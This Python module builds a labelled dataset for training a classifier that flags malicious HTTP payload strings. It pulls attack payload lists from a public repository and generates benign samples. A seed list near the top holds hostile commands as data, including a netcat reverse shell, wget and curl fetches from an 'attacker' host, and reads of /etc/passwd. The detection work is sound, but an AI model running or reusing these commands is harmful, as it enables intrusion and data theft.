"""Data collection utilities for suspicious and normal payload samples."""

from __future__ import annotations

import argparse
import base64
import hashlib
import random
import re
import string
import uuid
from typing import Iterable

import pandas as pd
import requests
from faker import Faker

from . import config


_PERCENT_ENCODED_RE = re.compile(r"%[0-9a-fA-F]{2}")
_HTTP_REFERENCE_RE = re.compile(r"^https?://", re.IGNORECASE)
_HIGH_RISK_CHARS_RE = re.compile(r"""['"%<>/\\;|&$`(){}\[\]]""")
_OS_SIGNATURES = (
    "Windows 95",
    "Windows 98",
    "Windows NT",
    "Mac OS X",
    "Solaris",
    "Linux",
    "Win9x",
    "WinNT",
    "FreeBSD",
    "MIPS",
    "StrongARM",
    "PowerPC",
    "x86",
)
_HTTP_CHARSETS = (
    "iso-8859-1",
    "iso-8859-2",
    "iso-8859-5",
    "windows-1251",
    "windows-1257",
    "utf-7",
    "utf-8",
    "utf-16",
    "shift_jis",
    "us-ascii",
    "cp-1252",
)
_COMMAND_INJECTION_SEEDS = (
    "xterm -display 127.0.0.1:1",
    "cat /etc/passwd",
    "type boot.ini",
    "/bin/bash -c whoami",
    "nc -e /bin/sh 10.10.10.10 4444",
    "tftp -i 10.10.10.10 GET payload.exe",
    "wget http://attacker/payload.sh",
    "curl http://attacker/payload.sh",
    "xp_cmdshell 'whoami'",
    "OPENROWSET(BULK 'C:\\boot.ini', SINGLE_CLOB)",
)


def _ensure_directories() -> None:
    """Ensures local project directories exist."""
    config.RAW_DATA_DIR.mkdir(parents=True, exist_ok=True)
    config.PROCESSED_DATA_DIR.mkdir(parents=True, exist_ok=True)
    config.MODELS_DIR.mkdir(parents=True, exist_ok=True)


def _build_session() -> requests.Session:
    """Builds an HTTP session with conservative defaults.

    Returns:
        Configured requests session.
    """
    session = requests.Session()
    session.headers.update(
        {
            "Accept": "application/vnd.github+json, text/plain; charset=utf-8",
            "User-Agent": config.HTTP_USER_AGENT,
        }
    )
    return session


def _fetch_text(url: str, session: requests.Session) -> str:
    """Fetches plain text from a remote URL.

    Args:
        url: Remote file URL.
        session: Shared HTTP session.

    Returns:
        Response body as text.

    Raises:
        requests.RequestException: If the request fails.
    """
    response = session.get(url, timeout=config.REQUEST_TIMEOUT_SECONDS)
    response.raise_for_status()
    return response.text


def _fetch_github_directory(
    directory: str,
    session: requests.Session,
) -> list[dict]:
    """Fetches GitHub Contents API metadata for a repository directory.

    Args:
        directory: Repository-relative directory.
        session: Shared HTTP session.

    Returns:
        List of metadata items returned by the API.
    """
    api_url = config.GITHUB_CONTENTS_API_TEMPLATE.format(
        repo=config.PAYLOADS_REPO,
        path=directory,
        branch=config.PAYLOADS_BRANCH,
    )
    response = session.get(api_url, timeout=config.REQUEST_TIMEOUT_SECONDS)
    response.raise_for_status()
    payload = response.json()
    if isinstance(payload, list):
        return payload
    return []


def _is_valid_intruder_file(item: dict) -> bool:
    """Checks whether a GitHub file should be parsed as a raw payload list.

    Only files directly inside a target `Intruder/` directory are eligible.
    Accepted files must either have a `.txt` extension or no extension at all.
    Markdown, scripts, JSON, and README files are explicitly rejected.

    Args:
        item: GitHub Contents API metadata for a file entry.

    Returns:
        True if the file should be fetched and parsed.
    """
    if item.get("type") != "file":
        return False

    file_name = item.get("name", "")
    lower_name = file_name.lower()

    if lower_name in config.EXCLUDED_INTRUDER_FILENAMES:
        return False

    if "." in file_name:
        extension = "." + lower_name.rsplit(".", 1)[1]
    else:
        extension = ""

    if extension in config.EXCLUDED_INTRUDER_EXTENSIONS:
        return False

    return extension in config.ALLOWED_INTRUDER_FILE_EXTENSIONS


def _list_intruder_files(
    payload_directory: str,
    session: requests.Session,
) -> list[dict]:
    """Lists valid payload files from a specific payload directory.

    Args:
        payload_directory: Repository-relative `Intruder/` or `Intruders/` directory.
        session: Shared HTTP session.

    Returns:
        List of GitHub file metadata entries.
    """
    items = _fetch_github_directory(directory=payload_directory, session=session)
    valid_items = [item for item in items if _is_valid_intruder_file(item)]
    return valid_items[: config.MAX_FILES_PER_SOURCE]


def clean_and_filter_payload(line: str) -> str | None:
    """Cleans and filters a raw payload line.

    The filtering rules are intentionally strict to remove markdown, prose, and
    repository references while preserving attack strings from Intruder payload
    lists.

    Args:
        line: Raw line from a candidate payload file.

    Returns:
        Cleaned payload string, or None if the line should be dropped.
    """
    candidate = line.strip()

    if not candidate:
        return None

    if candidate.startswith(("# ", "## ", "> ", "**")):
        return None

    if _HTTP_REFERENCE_RE.match(candidate):
        return None

    if len(candidate) < config.PAYLOAD_MIN_LENGTH or len(candidate) > config.PAYLOAD_MAX_LENGTH:
        return None

    lower_candidate = candidate.lower()
    has_suspicious_keyword = any(
        keyword in lower_candidate for keyword in config.SUSPICIOUS_KEYWORDS
    )
    space_count = candidate.count(" ")
    special_char_count = len(_HIGH_RISK_CHARS_RE.findall(candidate)) + len(
        _PERCENT_ENCODED_RE.findall(candidate)
    )
    special_char_density = special_char_count / max(len(candidate), 1)
    alpha_numeric_chars = sum(1 for char in candidate if char.isalnum() or char.isspace())
    alpha_numeric_density = alpha_numeric_chars / max(len(candidate), 1)

    if (
        space_count > 10
        and not has_suspicious_keyword
        and special_char_density < 0.05
        and alpha_numeric_density > 0.70
    ):
        return None

    return candidate


def _collect_payloads_from_file(file_name: str, raw_text: str, source_name: str) -> list[str]:
    """Parses a payload file line by line and logs filter effectiveness.

    Args:
        file_name: Display name of the source file.
        raw_text: File contents.
        source_name: Human-readable source category name.

    Returns:
        Deduplicated list of kept payload lines.
    """
    fetched_lines = 0
    kept_payloads: list[str] = []

    for line in raw_text.splitlines():
        fetched_lines += 1
        cleaned = clean_and_filter_payload(line)
        if cleaned is not None:
            kept_payloads.append(cleaned)

    deduplicated = list(dict.fromkeys(kept_payloads))
    print(
        f"[payloads] source={source_name} file={file_name} "
        f"fetched_lines={fetched_lines} kept_lines={len(deduplicated)}"
    )
    return deduplicated


def download_suspicious_payloads(force_refresh: bool = False) -> list[str]:
    """Downloads suspicious payloads from PayloadsAllTheThings.

    The loader prefers live GitHub content and falls back to a bootstrap list
    if remote access fails or returns no usable payloads.

    Args:
        force_refresh: Whether to ignore local cached raw data.

    Returns:
        Deduplicated suspicious payload strings.
    """
    _ensure_directories()

    if config.SUSPICIOUS_RAW_CACHE.exists() and not force_refresh:
        cached = [
            line.strip()
            for line in config.SUSPICIOUS_RAW_CACHE.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        if cached:
            return cached

    session = _build_session()
    payloads: list[str] = []

    for source in config.PAYLOAD_SOURCES:
        file_items: list[dict] = []

        for payload_directory in source.payload_directories:
            try:
                discovered_items = _list_intruder_files(payload_directory, session=session)
            except requests.RequestException:
                continue
            file_items.extend(discovered_items)

        for item in file_items:
            file_name = item.get("name", "<unknown>")
            download_url = item.get("download_url")
            if not download_url:
                continue
            try:
                raw_text = _fetch_text(download_url, session=session)
            except requests.RequestException:
                continue

            payloads.extend(
                _collect_payloads_from_file(
                    file_name=file_name,
                    raw_text=raw_text,
                    source_name=source.name,
                )
            )

    augmented_payloads = generate_augmented_suspicious_samples(sample_count=400)
    merged_payloads = list(
        dict.fromkeys(
            payloads
            + list(config.BOOTSTRAP_SUSPICIOUS_PAYLOADS)
            + augmented_payloads
        )
    )
    if not merged_payloads:
        merged_payloads = list(config.BOOTSTRAP_SUSPICIOUS_PAYLOADS)

    config.SUSPICIOUS_RAW_CACHE.write_text(
        "\n".join(merged_payloads),
        encoding="utf-8",
    )
    return merged_payloads


def _random_hex(randomizer: random.Random, length: int) -> str:
    """Builds a deterministic hexadecimal string."""
    alphabet = "0123456789abcdef"
    return "".join(randomizer.choice(alphabet) for _ in range(length))


def _random_slug(randomizer: random.Random, min_parts: int = 1, max_parts: int = 4) -> str:
    """Builds a deterministic, safe URI slug."""
    vocabulary = [
        "account",
        "api",
        "billing",
        "catalog",
        "checkout",
        "health",
        "home",
        "images",
        "invoices",
        "orders",
        "products",
        "profile",
        "reports",
        "search",
        "settings",
        "static",
        "users",
        "v1",
        "v2",
    ]
    parts = [randomizer.choice(vocabulary) for _ in range(randomizer.randint(min_parts, max_parts))]
    return "/" + "/".join(parts)


def _build_fake_jwt(fake: Faker, randomizer: random.Random) -> str:
    """Builds a benign JWT-like token for high-entropy negative samples."""
    header = '{"alg":"HS256","typ":"JWT"}'
    payload = (
        "{"
        f'"sub":"{fake.uuid4()}",'
        f'"name":"{fake.user_name()}",'
        f'"role":"{randomizer.choice(["user", "member", "editor"])}",'
        f'"iat":{randomizer.randint(1_700_000_000, 1_900_000_000)}'
        "}"
    )
    signature = "".join(
        randomizer.choices(string.ascii_letters + string.digits + "-_", k=43)
    )
    encoded_header = base64.urlsafe_b64encode(header.encode("utf-8")).decode("ascii").rstrip("=")
    encoded_payload = base64.urlsafe_b64encode(payload.encode("utf-8")).decode("ascii").rstrip("=")
    return f"{encoded_header}.{encoded_payload}.{signature}"


def _build_hash_sample(randomizer: random.Random) -> list[str]:
    """Builds benign MD5 and SHA256 hashes from common words."""
    source_word = randomizer.choice(
        [
            "account",
            "analytics",
            "avatar",
            "checkout",
            "dashboard",
            "invoice",
            "preferences",
            "profile",
            "session",
            "thumbnail",
        ]
    )
    return [
        hashlib.md5(source_word.encode("utf-8")).hexdigest(),
        hashlib.sha256(source_word.encode("utf-8")).hexdigest(),
    ]


def _build_rest_path(fake: Faker, randomizer: random.Random) -> str:
    """Builds a realistic safe REST or static asset path."""
    patterns = [
        lambda: f"/api/v1/users/{randomizer.randint(1, 500000)}",
        lambda: f"/api/v1/orders/{randomizer.randint(1, 500000)}/items",
        lambda: f"/api/v2/teams/{randomizer.randint(1, 10000)}/members/{randomizer.randint(1, 500000)}",
        lambda: f"/wp-content/uploads/{randomizer.randint(2021, 2026)}/{randomizer.randint(1, 12):02d}/{fake.file_name(extension=randomizer.choice(['png', 'jpg', 'webp']))}",
        lambda: f"/assets/js/{fake.slug()}.bundle.min.js",
        lambda: f"/assets/css/{fake.slug()}.min.css",
        lambda: f"/static/images/{fake.slug()}.{randomizer.choice(['svg', 'png', 'jpg'])}",
        lambda: f"/downloads/reports/{randomizer.randint(2022, 2026)}/{fake.slug()}.pdf",
        lambda: f"/content/{fake.slug()}/{randomizer.randint(1, 9999)}",
        lambda: _random_slug(randomizer, min_parts=2, max_parts=5),
    ]
    return randomizer.choice(patterns)()


def _build_safe_query_string(fake: Faker, randomizer: random.Random) -> str:
    """Builds realistic benign query parameters."""
    queries = [
        lambda: f"?search={'+'.join(fake.sentence(nb_words=4).lower().rstrip('.').split())}",
        lambda: (
            f"?page={randomizer.randint(1, 50)}&limit={randomizer.choice([10, 20, 25, 50, 100])}"
            f"&sort={randomizer.choice(['asc', 'desc'])}"
        ),
        lambda: (
            f"?category_id={randomizer.randint(1, 500)}&status="
            f"{randomizer.choice(['active', 'draft', 'archived'])}&view="
            f"{randomizer.choice(['grid', 'list'])}"
        ),
        lambda: (
            f"?q={'+'.join(fake.words(nb=3))}&lang="
            f"{randomizer.choice(['en', 'en-US', 'vi', 'fr', 'de'])}"
        ),
        lambda: (
            f"?from={fake.date()}&to={fake.date()}&timezone="
            f"{randomizer.choice(['UTC', 'Asia/Saigon', 'America/New_York'])}"
        ),
    ]
    return randomizer.choice(queries)()


def _build_header_or_agent(fake: Faker, randomizer: random.Random) -> str:
    """Builds realistic benign header and user-agent values."""
    headers = [
        lambda: f"User-Agent: {fake.user_agent()}",
        lambda: f"Accept: {randomizer.choice(config.SAFE_ACCEPT_VALUES)}",
        lambda: f"Accept-Encoding: {randomizer.choice(config.SAFE_ACCEPT_ENCODING_VALUES)}",
        lambda: f"Accept-Language: {randomizer.choice(config.SAFE_ACCEPT_LANGUAGE_VALUES)}",
        lambda: f"Cache-Control: {randomizer.choice(config.SAFE_CACHE_CONTROL_VALUES)}",
        lambda: f"Content-Type: {randomizer.choice(config.SAFE_MIME_TYPES)}",
        lambda: f"Host: {fake.domain_name()}",
        lambda: f"Referer: https://{fake.domain_name()}/{fake.slug()}",
        lambda: f"Origin: https://{fake.domain_name()}",
        lambda: f"X-Request-Id: {uuid.uuid4()}",
    ]
    return randomizer.choice(headers)()


def _build_http_date(randomizer: random.Random) -> str:
    """Builds a standard RFC-like HTTP date string."""
    weekdays = ("Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun")
    months = ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")
    timezone = randomizer.choice(("GMT", "UTC", "CET", "EST", "PST"))
    year = randomizer.choice((randomizer.randint(2004, 2026), randomizer.randint(4, 30)))
    return (
        f"{randomizer.choice(weekdays)}, {randomizer.randint(1, 28):02d} "
        f"{randomizer.choice(months)} {year} "
        f"{randomizer.randint(0, 23):02d}:{randomizer.randint(0, 59):02d}:{randomizer.randint(0, 59):02d} "
        f"{timezone}"
    )


def _build_ntlm_token(randomizer: random.Random) -> str:
    """Builds a benign NTLM-like authorization blob."""
    raw_bytes = bytes(randomizer.getrandbits(8) for _ in range(randomizer.randint(24, 64)))
    return "NTLM " + base64.b64encode(raw_bytes).decode("ascii")


def _build_clean_http_url(fake: Faker, randomizer: random.Random) -> str:
    """Builds a clean HTTP URL commonly seen in benign headers."""
    host = randomizer.choice(
        [
            f"www.{fake.domain_name()}",
            f"cdn.{fake.domain_name()}",
            f"static.{fake.domain_name()}",
        ]
    )
    path = "/".join(fake.words(nb=randomizer.randint(2, 5)))
    filename = fake.file_name(
        extension=randomizer.choice(["css", "js", "png", "jpg", "ico", "html", "txt"])
    )
    return f"http://{host}/{path}/{filename}"


def _build_benign_quoted_assignment(fake: Faker, randomizer: random.Random) -> str:
    """Builds a short benign quoted assignment to reduce quote-related false positives."""
    key = randomizer.choice(
        [
            "id",
            "user",
            "page",
            "theme",
            "locale",
            fake.lexify(text="????"),
        ]
    )
    value = randomizer.choice(
        [
            str(randomizer.randint(1, 9999)),
            fake.lexify(text="????"),
            fake.bothify(text="??##"),
            fake.user_name(),
        ]
    )
    return f"{key}='{value}'"


def _build_benign_legacy_url(fake: Faker, randomizer: random.Random) -> str:
    """Builds a benign URL using legacy dynamic extensions."""
    extension = randomizer.choice(["asp", "php", "cgi", "pl"])
    host = randomizer.choice(
        [
            f"www.{fake.domain_name()}",
            f"app.{fake.domain_name()}",
            f"legacy.{fake.domain_name()}",
        ]
    )
    path = "/".join(fake.words(nb=randomizer.randint(1, 3)))
    return f"https://{host}/{path}/{fake.slug()}.{extension}"


def _build_digest_nonce(fake: Faker, randomizer: random.Random) -> str:
    """Builds a benign Digest auth nonce-style value."""
    nonce = base64.b64encode(
        f"{fake.uuid4()}:{randomizer.randint(1_000_000, 9_999_999)}".encode("utf-8")
    ).decode("ascii")
    return (
        f'Digest realm="{fake.domain_name()}", nonce="{nonce}", '
        f'opaque="{fake.md5(raw_output=False)}", qop="auth"'
    )


def _build_digest_auth_field(fake: Faker, randomizer: random.Random) -> str:
    """Builds a single benign Digest auth field string."""
    field_name = randomizer.choice(
        ["nonce", "cnonce", "uri", "qop", "opaque", "username", "nc", "response"]
    )
    field_value = {
        "nonce": fake.lexify(text="????????????????"),
        "cnonce": fake.lexify(text="????"),
        "uri": f"/{fake.slug()}/{fake.slug()}",
        "qop": randomizer.choice(["auth", "auth-int"]),
        "opaque": fake.lexify(text="????????"),
        "username": fake.user_name(),
        "nc": f"{randomizer.randint(0, 99999999):08x}",
        "response": fake.md5(raw_output=False),
    }[field_name]

    if field_name in {"qop", "nc"}:
        return f"Digest {field_name}={field_value}"
    return f'Digest {field_name}="{field_value}"'


def _build_accept_charset_value(randomizer: random.Random) -> str:
    """Builds a benign Accept-Charset style value."""
    values: list[str] = []
    for _ in range(randomizer.randint(2, 4)):
        charset = randomizer.choice(_HTTP_CHARSETS)
        if randomizer.random() < 0.55:
            values.append(f"{charset};q=0.{randomizer.randint(1, 9)}")
        else:
            values.append(charset)
    return ", ".join(values)


def _build_client_version_list(fake: Faker, randomizer: random.Random) -> str:
    """Builds a benign comma-separated client/module version list."""
    modules: list[str] = []
    for _ in range(randomizer.randint(2, 5)):
        name = randomizer.choice(
            [
                fake.lexify(text="????"),
                fake.lexify(text="?????"),
                fake.bothify(text="??##"),
                fake.lexify(text="??????"),
            ]
        )
        modules.append(
            f"{name}/{randomizer.randint(0, 9)}.{randomizer.randint(0, 9)}"
        )
    return ", ".join(modules)


def _inject_control_characters(payload: str, randomizer: random.Random) -> str:
    """Injects control characters and extra whitespace into a command payload."""
    separators = ["\r", "\n", "\t", "  ", "   "]
    tokens = payload.split(" ")
    if len(tokens) == 1:
        return randomizer.choice(separators) + payload

    glitched = tokens[0]
    for token in tokens[1:]:
        glitched += randomizer.choice(separators) + token

    if randomizer.random() < 0.6:
        glitched = randomizer.choice(["\r", "\n", "\t"]) + glitched
    return glitched


def generate_augmented_suspicious_samples(sample_count: int = 200) -> list[str]:
    """Generates suspicious payloads with injected control characters."""
    randomizer = random.Random(config.RANDOM_STATE + 17)
    samples: list[str] = []
    for _ in range(sample_count):
        seed = randomizer.choice(_COMMAND_INJECTION_SEEDS)
        samples.append(_inject_control_characters(seed, randomizer))
    return list(dict.fromkeys(samples))


def _build_boundary_separator(randomizer: random.Random) -> str:
    """Builds a MIME boundary separator string."""
    boundary_char = randomizer.choice(("~", "-", "="))
    return boundary_char * randomizer.randint(16, 48)


def _build_http_false_positive_samples(fake: Faker, randomizer: random.Random) -> list[str]:
    """Builds benign strings that commonly look suspicious to naive models."""
    architecture_signatures = _OS_SIGNATURES + (
        "Windows NT 10.0",
        "x86_64",
        "amd64",
        "arm64",
    )
    etag_value = randomizer.choice(
        [
            f'"{fake.sha1(raw_output=False)}"',
            f'W/"{fake.md5(raw_output=False)}"',
            f'"{fake.lexify(text="????????????????")}"',
        ]
    )
    charset_value = randomizer.choice(("iso-8859", "iso-8859-1", "utf-8", "utf-16"))
    quality_value = randomizer.choice(("*;q=0.3", "*/*", "en;q=0.5", "gzip;q=0.7"))
    multipart_boundary = _build_boundary_separator(randomizer)

    return [
        fake.user_agent(),
        f"User-Agent: {fake.user_agent()}",
        _build_http_date(randomizer),
        f"Date: {_build_http_date(randomizer)}",
        etag_value,
        f"ETag: {etag_value}",
        f"If-None-Match: {etag_value}",
        quality_value,
        f"Accept: {quality_value}",
        charset_value,
        f"Accept-Charset: {charset_value}",
        _build_boundary_separator(randomizer),
        f"boundary={multipart_boundary}",
        f"Content-Type: multipart/form-data; boundary={multipart_boundary}",
        fake.email(),
        _build_ntlm_token(randomizer),
        f"Authorization: {_build_ntlm_token(randomizer)}",
        randomizer.choice(architecture_signatures),
        _build_digest_nonce(fake, randomizer),
        _build_digest_auth_field(fake, randomizer),
        f"Authorization: {_build_digest_auth_field(fake, randomizer)}",
        _build_accept_charset_value(randomizer),
        f"Accept-Charset: {_build_accept_charset_value(randomizer)}",
        _build_client_version_list(fake, randomizer),
        f"X-Client-Version: {_build_client_version_list(fake, randomizer)}",
        _build_clean_http_url(fake, randomizer),
        f"Referer: {_build_clean_http_url(fake, randomizer)}",
        _build_benign_legacy_url(fake, randomizer),
        f"Referer: {_build_benign_legacy_url(fake, randomizer)}",
        '$Version="7"',
    ]


def _build_symbol_rich_benign_samples(fake: Faker, randomizer: random.Random) -> list[str]:
    """Builds benign values with many special characters common in HTTP traffic."""
    etag_value = randomizer.choice(
        [
            f'W/"{fake.md5(raw_output=False)}"',
            f'"{fake.sha1(raw_output=False)}"',
        ]
    )
    cookie_pairs = [
        f"{randomizer.choice(config.SAFE_COOKIE_NAMES)}={fake.md5(raw_output=False)[:16]}",
        f"{randomizer.choice(config.SAFE_COOKIE_NAMES)}={randomizer.choice(config.SAFE_PARAM_VALUES)}",
        f"{randomizer.choice(config.SAFE_COOKIE_NAMES)}={uuid.uuid4()}",
    ]
    multipart_boundary = "".join(
        randomizer.choices(string.ascii_letters + string.digits, k=24)
    )

    return [
        randomizer.choice(config.SAFE_ACCEPT_VALUES),
        randomizer.choice(config.SAFE_ACCEPT_ENCODING_VALUES),
        randomizer.choice(config.SAFE_ACCEPT_LANGUAGE_VALUES),
        randomizer.choice(config.SAFE_CACHE_CONTROL_VALUES),
        randomizer.choice(config.SAFE_MIME_TYPES),
        f"Accept: {randomizer.choice(config.SAFE_ACCEPT_VALUES)}",
        f"Accept-Encoding: {randomizer.choice(config.SAFE_ACCEPT_ENCODING_VALUES)}",
        f"Accept-Language: {randomizer.choice(config.SAFE_ACCEPT_LANGUAGE_VALUES)}",
        f"Cache-Control: {randomizer.choice(config.SAFE_CACHE_CONTROL_VALUES)}",
        f"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{multipart_boundary}",
        f'Content-Disposition: form-data; name="file"; filename="{fake.slug()}.csv"',
        f"If-None-Match: {etag_value}",
        f"ETag: {etag_value}",
        f"Cookie: {'; '.join(cookie_pairs)}",
        f"/api/v1/search{_build_safe_query_string(fake, randomizer)}",
        f"/assets/js/{fake.slug()}.min.js?v={randomizer.randint(1, 50)}.{randomizer.randint(0, 20)}.{randomizer.randint(0, 20)}",
        f"{fake.user_name()}+alerts@{fake.domain_name()}",
        f"{fake.date()}T{randomizer.randint(0, 23):02d}:{randomizer.randint(0, 59):02d}:{randomizer.randint(0, 59):02d}.000Z",
    ]


def _build_special_char_sample(fake: Faker, randomizer: random.Random) -> str:
    """Builds benign strings containing safe special characters."""
    patterns = [
        lambda: fake.email(),
        lambda: f"{fake.user_name()}+{randomizer.choice(['alerts', 'billing', 'news'])}@{fake.domain_name()}",
        lambda: fake.date_time_between(start_date="-2y", end_date="now").isoformat() + "Z",
        lambda: f"{fake.date()}T{randomizer.randint(0, 23):02d}:{randomizer.randint(0, 59):02d}:{randomizer.randint(0, 59):02d}Z",
        lambda: f"{fake.user_name()}_{randomizer.randint(100, 999)}",
        lambda: f"filename={fake.file_name(extension=randomizer.choice(['csv', 'json', 'txt']))}",
    ]
    return randomizer.choice(patterns)()


def _build_benign_high_entropy_sample(fake: Faker, randomizer: random.Random) -> list[str]:
    """Builds high-entropy but benign values."""
    session_cookie = "".join(
        randomizer.choices(string.ascii_letters + string.digits, k=randomizer.randint(32, 96))
    )
    cookie_name = randomizer.choice(["sessionid", "csrftoken", "auth_token", "visitor_id"])
    samples = [
        str(uuid.uuid4()),
        _build_fake_jwt(fake, randomizer),
        f"{cookie_name}={session_cookie}",
        "".join(randomizer.choices(string.ascii_letters + string.digits, k=48)),
    ]
    samples.extend(_build_hash_sample(randomizer))
    return samples


def generate_normal_data(target_count: int) -> list[str]:
    """Generates diverse benign HTTP component values.

    Args:
        target_count: Exact number of unique normal samples to generate.

    Returns:
        Exactly `target_count` deduplicated normal strings.
    """
    if target_count <= 0:
        return []

    randomizer = random.Random(config.RANDOM_STATE)
    fake = Faker()
    Faker.seed(config.RANDOM_STATE)
    fake.seed_instance(config.RANDOM_STATE)

    samples: list[str] = []
    seen: set[str] = set()

    def add_sample(value: str) -> None:
        normalized = value.strip()
        if not normalized or normalized in seen:
            return
        seen.add(normalized)
        samples.append(normalized)

    def add_many(values: list[str]) -> None:
        for value in values:
            add_sample(value)

    seed_samples = (
        list(config.STANDARD_HTTP_HEADERS)
        + list(config.COMMON_USER_AGENTS)
        + list(config.SAFE_URI_PREFIXES)
        + list(config.SAFE_PARAM_VALUES)
        + list(config.SAFE_FILE_PATHS)
        + list(config.SAFE_HTTP_HEADER_NAMES)
    )
    for value in seed_samples:
        add_sample(value)

    while len(samples) < target_count:
        add_sample(_build_rest_path(fake, randomizer))
        add_sample(_build_rest_path(fake, randomizer) + _build_safe_query_string(fake, randomizer))
        add_many(_build_benign_high_entropy_sample(fake, randomizer))
        add_many(_build_http_false_positive_samples(fake, randomizer))
        add_many(_build_symbol_rich_benign_samples(fake, randomizer))
        add_sample(_build_header_or_agent(fake, randomizer))
        add_sample(_build_safe_query_string(fake, randomizer))
        add_sample(_build_benign_quoted_assignment(fake, randomizer))
        add_sample(f"id='{randomizer.randint(1, 999999)}'")
        add_sample(_build_benign_legacy_url(fake, randomizer))
        add_sample(
            f"{randomizer.choice(['search', 'page', 'limit', 'sort', 'filter'])}="
            f"{randomizer.choice(config.SAFE_PARAM_VALUES + (fake.slug(), fake.word(), str(randomizer.randint(1, 500)),))}"
        )
        add_sample(_build_special_char_sample(fake, randomizer))
        add_sample(str(randomizer.randint(0, 10_000_000)))
        add_sample(_build_rest_path(fake, randomizer))

    balanced_samples = samples[:target_count]
    config.NORMAL_RAW_CACHE.write_text("\n".join(balanced_samples), encoding="utf-8")
    return balanced_samples


def build_training_dataframe(force_refresh: bool = False) -> pd.DataFrame:
    """Builds a unified training dataframe with text and label columns.

    Args:
        force_refresh: Whether to re-fetch suspicious payloads.

    Returns:
        Shuffled dataframe containing `text` and `label`.
    """
    _ensure_directories()

    suspicious_samples = download_suspicious_payloads(force_refresh=force_refresh)
    normal_samples = generate_normal_data(target_count=len(suspicious_samples))

    rows = [{"text": text, "label": 1} for text in suspicious_samples]
    rows.extend({"text": text, "label": 0} for text in normal_samples)

    dataframe = pd.DataFrame(rows).drop_duplicates(subset=["text"]).sample(
        frac=1.0,
        random_state=config.RANDOM_STATE,
    )
    dataframe = dataframe.reset_index(drop=True)

    try:
        dataframe.to_parquet(config.PROCESSED_DATASET_PATH, index=False)
    except Exception:
        dataframe.to_csv(config.PROCESSED_DATASET_FALLBACK_CSV, index=False)

    return dataframe


def load_dataset(force_refresh: bool = False) -> pd.DataFrame:
    """Loads a cached processed dataset or rebuilds it.

    Args:
        force_refresh: Whether to bypass cached processed data.

    Returns:
        Training dataframe.
    """
    if not force_refresh and config.PROCESSED_DATASET_PATH.exists():
        return pd.read_parquet(config.PROCESSED_DATASET_PATH)
    if not force_refresh and config.PROCESSED_DATASET_FALLBACK_CSV.exists():
        return pd.read_csv(config.PROCESSED_DATASET_FALLBACK_CSV)
    return build_training_dataframe(force_refresh=force_refresh)


def preview_samples(samples: Iterable[str], limit: int = 10) -> list[str]:
    """Returns a small sample preview for debugging or inspection."""
    return list(samples)[:limit]


def main() -> None:
    """Command-line entrypoint for dataset preparation."""
    parser = argparse.ArgumentParser(description="Build gatekeeper training dataset.")
    parser.add_argument(
        "--force-refresh",
        action="store_true",
        help="Re-fetch suspicious payload data from GitHub.",
    )
    args = parser.parse_args()

    dataframe = build_training_dataframe(force_refresh=args.force_refresh)
    distribution = dataframe["label"].value_counts().to_dict()
    print(f"Saved dataset with shape={dataframe.shape} label_distribution={distribution}")


if __name__ == "__main__":
    main()
